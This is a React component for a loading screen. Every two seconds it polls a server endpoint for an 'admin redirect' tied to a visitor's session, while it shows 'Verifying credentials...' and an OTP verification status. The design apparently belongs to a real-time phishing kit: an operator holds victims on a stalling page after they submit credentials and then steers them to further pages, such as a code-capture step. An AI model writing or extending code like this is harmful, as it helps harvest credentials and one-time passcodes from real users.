import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { useTranslation } from "@/contexts/LanguageContext";

export default function Loading() {
  const [, setLocation] = useLocation();
  const { t } = useTranslation();
  const [sessionId] = useState(() => localStorage.getItem("visitorSessionId") || "");

  useEffect(() => {
    // Check for admin redirect every 2 seconds
    const checkRedirect = async () => {
      try {
        const response = await fetch("/api/check-redirect", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ sessionId }),
        });

        if (response.ok) {
          const data = await response.json();
          if (data.redirect) {
            console.log(`🎯 REDIRECTING FROM LOADING TO: ${data.redirect}`);
            setLocation(data.redirect);
          }
        }
      } catch (error) {
        console.error("Failed to check redirect:", error);
      }
    };

    // Start polling for redirects
    const pollInterval = setInterval(checkRedirect, 2000);
    checkRedirect(); // Check immediately

    return () => clearInterval(pollInterval);
  }, [setLocation, sessionId]);

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-white">
      <div className="text-center space-y-8">
        {/* Loading Spinner */}
        <div className="flex justify-center">
          <div className="relative w-24 h-24">
            <div className="absolute inset-0 border-4 border-gray-200 rounded-full"></div>
            <div className="absolute inset-0 border-4 border-black border-t-transparent rounded-full animate-spin"></div>
          </div>
        </div>

        {/* Loading Text */}
        <div className="space-y-4">
          <h1 className="text-3xl font-bold text-black">{t('loading_title')}</h1>
          <p className="text-lg text-gray-600">
            {t('loading_subtitle')}
          </p>
        </div>

        {/* Waiting Message */}
        <div className="mt-8">
          <div className="inline-flex items-center justify-center px-6 py-3 rounded-full border-2 border-black">
            <span className="text-lg font-medium text-black">Verifying credentials...</span>
          </div>
          <p className="mt-4 text-sm text-gray-500">Please wait</p>
        </div>

        {/* Infinite Progress Bar */}
        <div className="w-80 h-2 bg-gray-200 rounded-full overflow-hidden mx-auto">
          <div className="h-full bg-black w-1/3 animate-pulse"></div>
        </div>

        {/* Status Messages */}
        <div className="mt-12 space-y-2 text-sm text-gray-600">
          <p className="flex items-center justify-center gap-2">
            <span className="inline-block w-2 h-2 bg-green-500 rounded-full"></span>
            {t('loading_status_secure')}
          </p>
          <p className="flex items-center justify-center gap-2">
            <span className="inline-block w-2 h-2 bg-yellow-500 rounded-full animate-pulse"></span>
            {t('loading_status_verifying')}
          </p>
          <p className="flex items-center justify-center gap-2">
            <span className="inline-block w-2 h-2 bg-gray-400 rounded-full"></span>
            {t('loading_status_otp')}
          </p>
        </div>
      </div>
    </div>
  );
}
